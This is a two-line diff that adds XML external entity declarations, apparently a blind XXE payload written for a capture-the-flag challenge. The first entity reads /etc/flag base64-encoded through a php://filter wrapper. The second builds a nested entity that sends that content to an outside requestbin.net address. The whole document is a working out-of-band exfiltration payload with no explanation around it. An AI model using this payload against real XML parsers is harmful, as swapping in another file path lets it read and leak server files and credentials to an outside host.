@@ -1,0 +1,2 @@
+<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=///etc/flag">
+<!ENTITY % intern "<!ENTITY &#37; trick SYSTEM 'http://requestbin.net/r/1m2xehr1?%payl;'>">
